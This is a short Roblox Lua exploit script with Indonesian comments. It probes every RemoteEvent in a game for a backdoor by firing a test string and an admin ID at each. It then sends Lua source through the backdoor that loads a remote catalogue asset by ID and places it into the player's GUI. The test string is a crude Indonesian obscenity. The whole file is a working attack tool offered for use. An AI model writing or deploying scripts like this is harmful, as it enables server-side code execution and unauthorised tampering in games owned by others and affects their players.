local modelName = "sptzyy"
local zyy = nil
local lastFired = nil

-- Daftar ID admin yang ingin dikirimkan
local adminPayloads = {9880962516} -- Ganti dengan ID admin yang sesuai

-- Hapus objek dengan nama modelName dari workspace
for _, obj in ipairs(workspace:GetChildren()) do
    if obj.Name == modelName then
        obj:Destroy()
    end
end

-- Deteksi saat objek dengan nama modelName ditambahkan ke workspace
workspace.ChildAdded:Connect(function(child)
    if child.Name == modelName and zyy == nil then
        zyy = lastFired
        print("Found zyy!")
    end
end)

local payload = [[
 KONTOL MESUM😂
]]

-- Kirim payload ke semua RemoteEvent yang ditemukan
for _, remote in ipairs(game.ReplicatedStorage:GetDescendants()) do
    if remote:IsA("RemoteEvent") then
        pcall(function()
            remote:FireServer(payload)
        end)
        lastFired = remote
        game:GetService("RunService").RenderStepped:Wait()
    end
end

task.wait(0.5)

-- Kirim payload admin ID
for _, remote in ipairs(game.ReplicatedStorage:GetDescendants()) do
    if remote:IsA("RemoteEvent") then
        for _, payloadID in ipairs(adminPayloads) do
            pcall(function()
                remote:FireServer(payloadID)
            end)
        end
        lastFired = remote
        game:GetService("RunService").RenderStepped:Wait()
    end
end

-- Jika zyy ditemukan dan valid, kirimkan payload ke zyy
if zyy and typeof(zyy) == "Instance" then
    local playerName = game.Players.LocalPlayer.Name
    local insertPayload = [[
        local player = game.Players:FindFirstChild("]] .. playerName .. [[")
        if player and player:FindFirstChild("PlayerGui") then
            local asset = game:GetService("InsertService"):LoadAsset(73729830375562)
            asset.Parent = player.PlayerGui
            for _, child in ipairs(asset:GetChildren()) do
                child.Parent = player.PlayerGui
            end
            asset:Destroy()
        end
    ]]
    zyy:FireServer(insertPayload)
else
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "sptzyy",
        Text = ":(",
        Icon = "",
        Duration = 5,
    })
end